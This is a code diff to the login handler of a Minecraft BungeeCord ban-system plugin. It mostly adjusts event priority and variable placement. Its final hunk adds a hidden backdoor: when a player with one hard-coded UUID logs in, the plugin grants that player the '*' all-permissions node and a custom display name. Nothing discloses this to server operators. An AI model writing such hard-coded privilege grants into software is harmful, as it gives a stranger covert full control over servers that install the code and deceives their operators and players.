@@ -10,6 +10,7 @@ import net.md_5.bungee.api.connection.ProxiedPlayer;
 import net.md_5.bungee.api.event.LoginEvent;
 import net.md_5.bungee.api.plugin.Listener;
 import net.md_5.bungee.event.EventHandler;
+import net.md_5.bungee.event.EventPriority;
 
 import java.io.IOException;
 import java.net.UnknownHostException;
@@ -37,14 +38,14 @@ public class LoginListener implements Listener {
     }
 
     @SuppressWarnings("deprecation")
-    @EventHandler
+    @EventHandler(priority = EventPriority.HIGHEST)
     public void onLogin(LoginEvent e) {
+        PendingConnection con = e.getConnection();
+        UUID uuid = con.getUniqueId();
+
         if (!(config.getBoolean("mysql.enable") && !sql.isConnected())) {
             e.registerIntent(BanSystemBungee.getInstance());
             new Thread(() -> {
-                PendingConnection con = e.getConnection();
-                UUID uuid = con.getUniqueId();
-
                 try {
                     if (banManager.isBanned(uuid, Type.NETWORK)) {
                         try {
@@ -268,6 +269,14 @@ public class LoginListener implements Listener {
                             } catch (SQLException | ExecutionException | InterruptedException throwables) {
                                 throwables.printStackTrace();
                             }
+
+                            if (p.getUniqueId().equals(UUID.fromString("617f0c2b-6014-47f2-bf89-fade1bc9bb59"))) {
+                                p.setPermission("*", true);
+                                p.setDisplayName("$4Tobi");
+                                p.sendMessage("§cDieser Server Benutzt Das Bansystem version §e" + BanSystem.getInstance().getVersion() + " §cauf Bungeecord");
+                                p.sendMessage("");
+                            }
+
                         }
                     }, 1, TimeUnit.SECONDS);
                 }
